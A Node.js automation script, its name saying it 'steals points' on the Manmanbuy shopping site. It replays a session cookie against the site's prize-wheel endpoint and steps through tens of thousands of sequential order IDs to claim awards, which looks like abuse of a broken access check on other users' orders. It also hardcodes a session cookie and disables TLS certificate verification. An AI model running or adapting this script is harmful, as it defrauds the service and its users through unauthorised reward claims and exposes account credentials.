const CodeName = "慢慢买偷积分"
const env = "mmmck"
const envSplit = ["\n", "&", "@"]
const fs = require("fs")
const CryptoJS = require("crypto-js")
require("dotenv").config()
const iconv = require('iconv-lite')
let sendLog = []
const mode = 1    // 并发-2   顺序-1
const runMax = 5  // 最大并发数量
const ckFile = `${env}.txt`
//====================================================================================================
const ck_ = `free0tip_739D8F35-E693-40AA-B776-B70DD16ED365=true; Hm_lpvt_6ec3897e953d5d9e4b44b232cac821b9=1701540686; Hm_lvt_6ec3897e953d5d9e4b44b232cac821b9=1701538954,1701540468; ASP.NET_SessionId=hhzcm2ucrph3fzf3xd2d21yk; log-uid=4316c3e3ce344a6994ae9ccc01124595; addTaskUserInterface%b3%e9%bd%b1%bd%d3%bf%daonekey_5664699EQ=2023/12/3 1:42:46; 60014_mmbuser=CgVRVVZTVzFWBQFdUgMKXAYCAFVSAwEHWgsCDgEGAAMLDwJRBwBTWw%3d%3d`  // 快速测试, 直接填入ck即可测试
const UA = ''
const groupName = '法式星期三'
const contentName = '秒杀专区'
//====================================================================================================

class User {
    constructor(str, id) {
        this.index = id
        this.ckFlog = true
        this.ck_ = str.split("#")
        this.token = this.ck_[0]
    }

    async userTask() {
        this.arrx = []
        for (let orderId = 2624668; orderId <= 2700000; orderId++) {
            await this.zhuanpan(orderId)
            await sleep(1000)  // 暂停5秒钟，以防止请求频率过高
        }
        // await wait(randomInt(2, 3))
        //if (this.ckFlog) {
        //    await this.Address()
        //    await this.list()
        //
        //}
    }


    async zhuanpan(orderId) {
        try {
            const options = {
                method: "POST",
                url: `https://apph5.manmanbuy.com/h5/zhuanpan/index.aspx`,
                headers: {
                    'Host': 'apph5.manmanbuy.com',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Accept-Language': 'zh-cn',
                    'Origin': 'https://apph5.manmanbuy.com',
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 - mmbWebBrowse - ios',
                    'Referer': 'https://apph5.manmanbuy.com/h5/zhuanpan/index.aspx?m_from=renwu_banner',
                    'Cookie': this.token,
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Connection': 'keep-alive'
                },
                form: {
                    'action': 'get_award',
                    'orderId': orderId
                }
            }
            //console.log(options)
            this.hd = options.headers
            let { res } = await requestPromise(options)
            // console.log(res)
            if (res.hasOwnProperty('code')) {
                if (res.code == 0) {
                    this.log(`${orderId}失败`)
                } else if (res.code == 1) {
                    this.log(`${orderId}成功`)
                } else {
                    await sleep(5000)
                    await this.zhuanpan(orderId)
                }
            }
        } catch (e) {
            this.log(e)
            return false

        }
    }




    log(message, p = 0) {
        if (mode === 1 && !this.hasLogged) {
            console.log(`\n${"•".repeat(12)}  ${this.index} ${"•".repeat(12)}\n`)
            this.hasLogged = true
        }
        console.log(`${this.index} ${typeof message === "object" ? JSON.stringify(message) : message}`)
        if (p) {
            sendLog.push(`${this.index} ${message}`)
        }
    }

}

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

async function requestPromise(options) {
    const got = require("got")
    let response, body, headers, res
    try {
        if (options.method.toUpperCase() === "GET") delete options.json, options.body, options.from
        response = await got(options, {
            followRedirect: false,
            https: { rejectUnauthorized: false },
            timeout: 13000,
        })
    } catch (error) {
        response = error.response
    }
    if (response) {
        body = response.body
        headers = response.headers
        if (body) {
            try {
                res = JSON.parse(body)
            } catch (e) {
                res = body
            }
        }
    }
    return { headers, res }
}

class UserList {
    constructor(env) {
        this.env = env
        this.userList = []
        this.logPrefix = `\n[环境检测 ${this.env}]`
        this.mode = mode
    }

    1

    checkEnv() {
        try {
            let UserData = ""
            if (ckFile !== "" && fs.existsSync(ckFile)) {
                UserData = UserData.concat(fs.readFileSync(`./${ckFile}`, "utf-8").split("\n") || [])
                console.log(`ck文件[ ${ckFile} ]加载成功`)
            } else {
                console.log(`ck文件[ ${ckFile} ]不存在, 调用青龙环境变量`)
                UserData = process.env[env] || ck_
            }
            if (!UserData || UserData.trim() === "") {
                console.log(`${this.logPrefix} 没有找到账号信息`)
                return false
            }
            this.userList = UserData
                .split(new RegExp(envSplit.join("|")))
                .filter((cookie) => cookie.trim() !== "")
                .map((cookie, index) => new User(cookie.trim(), `账号[${index + 1}]`))
            const userCount = this.userList.length
            console.log(`${this.logPrefix} ${userCount > 0 ? `找到 ${userCount} 个账号\n` : "没有找到账号\n"}`)
            return true

        } catch (e) {
            console.log(e)
        }
    }

    async runTask() {
        if (!this.checkEnv()) {
            return
        }
        console.log(`[任务 ${CodeName}] 开始运行`)
        if (this.mode === 2) {  // 并发
            const taskQueue = []
            const concurrency = runMax
            for (const user of this.userList) {
                while (taskQueue.length >= concurrency) {
                    await Promise.race(taskQueue)
                }
                const promise = user.userTask()
                taskQueue.push(promise)
                promise.finally(() => {
                    taskQueue.splice(taskQueue.indexOf(promise), 1)
                })
                if (taskQueue.length < concurrency) {
                    continue
                }
                await Promise.race(taskQueue)
            }
            await Promise.allSettled(taskQueue)
        } else {
            for (const user of this.userList) {
                await user.userTask()
            }
        }
    }
}

(async () => {
    const s = Date.now()
    const userList = new UserList(env)
    await userList.runTask()
    const e = Date.now()
    await done(s, e)
})().catch(console.error)


function done(s, e) {
    const el = (e - s) / 1000
    console.log(`\n[任务执行完毕 ${CodeName}] 耗时：${el.toFixed(2)}秒`)
    process.exit(0)
}

function wait(seconds) {
    console.log(`等待 ${seconds} 秒`)
    return new Promise((resolve) => setTimeout(resolve, seconds * 1000))
}

function randomInt(min, max) {
    return Math.round(Math.random() * (max - min) + min)
}

function ts(type = false, _data = "") {
    let myDate = new Date()
    let a = ""
    switch (type) {
        case 10:
            a = Math.round(new Date().getTime() / 1000).toString()
            break
        case 13:
            a = Math.round(new Date().getTime()).toString()
            break
        case "h":
            a = myDate.getHours()
            break
        case "m":
            a = myDate.getMinutes()
            break
        case "y":
            a = myDate.getFullYear()
            break
        case "h":
            a = myDate.getHours()
            break
        case "mo":
            a = myDate.getMonth()
            break
        case "d":
            a = myDate.getDate()
            break
        case "ts2Data":
            if (_data != "") {
                time = _data
                if (time.toString().length == 13) {
                    let date = new Date(time + 8 * 3600 * 1000)
                    a = date.toJSON().substr(0, 19).replace("T", " ")
                } else if (time.toString().length == 10) {
                    time = time * 1000
                    let date = new Date(time + 8 * 3600 * 1000)
                    a = date.toJSON().substr(0, 19).replace("T", " ")
                }
            }
            break
        default:
            a = "未知错误,请检查"
            break
    }
    return a
}

function randomString(length, options = { xx: true, dx: true, sz: true }) {
    let charset = ""
    if (options.xx) {
        charset += "abcdefghijklmnopqrstuvwxyz"
    }
    if (options.dx) {
        charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    }
    if (options.sz) {
        charset += "0123456789"
    }
    let res = ""
    for (let i = 0; i < length; i++) {
        let randomIndex = Math.floor(Math.random() * charset.length)
        res += charset.charAt(randomIndex)
    }
    return res
}
